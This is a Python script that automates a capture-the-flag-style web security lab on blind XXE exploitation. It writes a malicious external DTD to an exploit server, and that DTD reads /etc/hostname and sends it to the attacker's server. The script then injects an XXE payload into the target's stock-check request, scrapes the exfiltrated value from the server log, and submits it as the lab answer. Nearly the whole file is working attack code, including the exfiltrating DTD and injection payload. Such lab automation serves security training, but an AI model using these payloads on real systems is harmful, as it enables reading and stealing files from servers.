import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Exploiting blind XXE to exfiltrate data using a malicious external DTD"


def run(url, payload, proxies=None):
    url = url.rstrip('/')
    paths = ["/"]
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Store the malicious DTD file in your exploit server\n2. Inject payload into the XML-based check stock request to exfiltrate the hostname using an external DTD\n3. Check your burp collaborator for the hostname in the HTTP request query parameter\n4. Submit the solution\n""")

    headers = {"Content-Type": "application/xml"}
    print(Fore.WHITE + "Injection point: " +
          Fore.YELLOW + "Check stock request")
    # burp_input = input("[?] Enter the Burp Collaborator URL: ").strip()
    exploit_input = input("[?] Enter the exploit server URL: ").strip()
    exploit_input = exploit_input.rstrip('/')

    print(Fore.WHITE +
          "[1] Storing the malicious DTD file on your exploit server")
    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8"
    malicious_file_name = "exploit.dtd"
    malicious_file = f"""<!ENTITY % file SYSTEM "file:///etc/hostname">
                            <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '{exploit_input}/?hostname=%file;'>">
                            %eval;
                            %exfiltrate;"""

    data = {"responseFile": f"/{malicious_file_name}", "responseBody": malicious_file,
            "responseHead": response_head, "formAction": "STORE", "urlIsHttps": "on"}

    requests.post(exploit_input, data=data, allow_redirects=False,
                  verify=False, proxies=proxies)

    print(Fore.WHITE + "[2] Using the external DTD to exfiltrate the hostname")

    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{exploit_input}/{malicious_file_name}"> %xxe; ]>
<stockCheck>
    <productId>2</productId>
    <storeId>1</storeId>
</stockCheck>"""

    try:
        requests.post(
            f"{url}/product/stock", data=payload, headers=headers, allow_redirects=False, verify=False, proxies=proxies)
        log_res = requests.get(f"{exploit_input}/log", verify=False)
        match = re.search(r"/\?hostname=(.*?) HTTP", log_res.text)
        if match:
            hostname = match.group(1)
            print(Fore.YELLOW + f"[+] Found hostname: {hostname}")
        else:
            print(Fore.RED + "[-] Could not extract hostname from logs.")
            return False

        print(Fore.WHITE + "hostname: " + Fore.YELLOW + hostname)
        print(Fore.WHITE + "[3] Submitting the hostname to solve the lab")
        data = {"answer": hostname}
        submit_url = f"{url}/submitSolution"
        submit_res = requests.post(
            submit_url, data=data, verify=False, proxies=proxies)

        return True

    except Exception as e:
        print(f"[!] Failed to check stock with the injected payload through exception")
        return False
